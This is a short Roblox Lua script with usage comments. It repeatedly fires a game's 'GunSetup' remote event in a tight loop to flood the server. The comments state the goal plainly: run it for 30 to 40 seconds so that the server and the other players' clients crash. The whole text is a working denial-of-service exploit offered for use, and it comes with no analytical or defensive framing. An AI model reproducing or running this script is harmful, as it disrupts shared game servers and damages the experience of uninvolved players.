_G.maybe = false
--How to use:
--Change _G.maybe to true and run for like 30-40secs
--Change _G.maybe to false and wait like 10secs for the ping to settle
--Reset your character, this may crash the roblox client depending how long you ran it
--Server or you crashes along with the others :)

while _G.maybe do
    task.wait()
    local userdata_1 = game:GetService("ReplicatedStorage").ONYX.Guns.AK47;
    local bool_1 = true;
    local Target = game:GetService("ReplicatedStorage").ONYX.Remotes.GunSetup;
    Target:FireServer(userdata_1, bool_1);
end